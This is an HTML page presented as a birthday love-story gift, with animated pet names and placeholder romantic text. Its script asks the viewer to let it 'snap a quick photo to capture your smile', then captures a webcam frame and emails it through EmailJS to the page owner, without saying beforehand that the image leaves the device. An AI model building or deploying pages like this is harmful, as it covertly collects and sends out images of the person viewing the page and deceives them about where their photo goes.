<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>A Love Story for My Dearest</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
</head>
<body class="bg-pink-50 text-gray-800 font-sans">
    <!-- Full-screen overlay for photo capture prompt -->
    <div id="photoPrompt" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
        <div class="bg-white p-6 rounded-lg shadow-lg text-center">
            <p class="text-lg mb-4">Hey love, can I snap a quick photo to capture your smile?</p>
            <button id="allowPhoto" class="bg-pink-500 text-white px-4 py-2 rounded hover:bg-pink-600">Allow</button>
            <button id="denyPhoto" class="bg-gray-300 text-gray-800 px-4 py-2 rounded hover:bg-gray-400 ml-2">No Thanks</button>
        </div>
    </div>

    <!-- Main content -->
    <div class="container mx-auto p-6">
        <!-- Scrolling names animation -->
        <div class="text-center mb-12">
            <h1 class="text-4xl md:text-6xl font-bold text-pink-600">
                <span id="nameDisplay" class="inline-block transition-opacity duration-1000"></span>
            </h1>
        </div>

        <!-- Novel content -->
        <div class="bg-white p-8 rounded-lg shadow-lg max-w-2xl mx-auto">
            <h2 class="text-3xl font-semibold text-center mb-6">Our Spicy Love Story</h2>
            <div id="novelContent" class="prose">
                <!-- Replace this with your novel content -->
                <p>Once upon a time, in a world filled with magic, there was youâ€”my muse, my love, my everything. This story is for you, written with every beat of my heart...</p>
                <p>Your laughter lights up my world, and every moment with you feels like a chapter in the greatest romance ever told. [Insert your novel content here]</p>
                <p>Happy Birthday, my darling. May our story continue for a lifetime.</p>
            </div>
        </div>
    </div>

    <script>
        // Initialize EmailJS with your User ID
        (function(){
            emailjs.init("v2bcBugmJJif5y6z6");
        })();

        // Names array for scrolling animation
        const names = ["My Love", "Darling", "Sweetheart", "My Muse", "Beautiful"]; // Add her names/pet names
        let nameIndex = 0;
        const nameDisplay = document.getElementById("nameDisplay");

        // Scrolling animation for names
        function cycleNames() {
            nameDisplay.style.opacity = 0;
            setTimeout(() => {
                nameDisplay.textContent = names[nameIndex];
                nameDisplay.style.opacity = 1;
                nameIndex = (nameIndex + 1) % names.length;
            }, 1000);
        }
        cycleNames();
        setInterval(cycleNames, 3000);

        // Photo capture logic
        const photoPrompt = document.getElementById("photoPrompt");
        const allowPhoto = document.getElementById("allowPhoto");
        const denyPhoto = document.getElementById("denyPhoto");

        // Check if running on HTTPS or localhost
        function isSecureContext() {
            return window.location.protocol === "https:" || window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
        }

        // Show photo prompt on page load if webcam is supported
        window.addEventListener("load", () => {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                console.warn("Webcam not supported in this browser.");
                return;
            }
            if (!isSecureContext()) {
                console.warn("Webcam access requires HTTPS or localhost.");
                return;
            }
            photoPrompt.classList.remove("hidden");
        });

        allowPhoto.addEventListener("click", async () => {
            photoPrompt.classList.add("hidden");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement("video");
                video.srcObject = stream;
                video.play();

                // Wait for video to be ready
                await new Promise(resolve => video.onloadedmetadata = resolve);

                // Capture photo after a short delay
                setTimeout(() => {
                    const canvas = document.createElement("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext("2d").drawImage(video, 0, 0);
                    const imageData = canvas.toDataURL("image/png");

                    // Send photo via EmailJS
                    emailjs.send("service_oxhzzsf", "template_50hyksc", {
                        attachment: imageData
                    })
                    .then(() => {
                        console.log("Photo sent successfully via email");
                        alert("Photo sent! Enjoy the story!");
                    })
                    .catch(error => {
                        console.error("Error sending photo:", error);
                        alert("Photo couldn't be sent, but enjoy the story!");
                    });

                    // Clean up
                    stream.getTracks().forEach(track => track.stop());
                }, 1000);
            } catch (error) {
                console.error("Error accessing webcam:", error.name, error.message);
                alert("Couldn't access the webcam. Enjoy the story anyway!");
            }
        });

        denyPhoto.addEventListener("click", () => {
            photoPrompt.classList.add("hidden");
        });
    </script>
</body>
</html>